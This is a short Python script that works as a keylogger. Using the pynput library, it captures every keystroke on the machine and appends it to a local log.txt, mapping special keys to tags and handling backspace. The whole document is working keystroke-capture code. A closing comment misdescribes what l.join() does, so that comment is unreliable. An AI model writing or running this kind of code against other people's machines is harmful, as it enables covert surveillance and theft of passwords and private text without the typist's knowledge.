from pynput.keyboard import Key, Listener, Controller


caps_lock_enabled = False

def write_to_file(key):
    global caps_lock_enabled

    letter = str(key)
    letter =letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == '':
        letter = ""
    elif letter == 'Key.shift' or letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == 'Key.caps_lock':
        letter = ""
    elif letter == 'Key.backspace':
        with open("log.txt", 'rb+') as f:
            f.seek(-1, 2)
            f.truncate()
            return
    elif letter == 'Key.alt':
        letter = '[ALT]'
    elif letter == 'Key.tab':
        letter = '\t'
    elif letter == 'Key.down':
        letter = '[DOWN]'
    elif letter == 'Key.left':
        letter = '[LEFT]'
    elif letter == 'Key.right':
        letter = '[RIGHT]'
    elif len(letter) > 1:  # Special characters
        letter = '[{}]'.format(letter.upper())

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l: #instance of Listener object is stored in variable 'l' like above
    l.join()  #joins all the letters together with single quotes for all
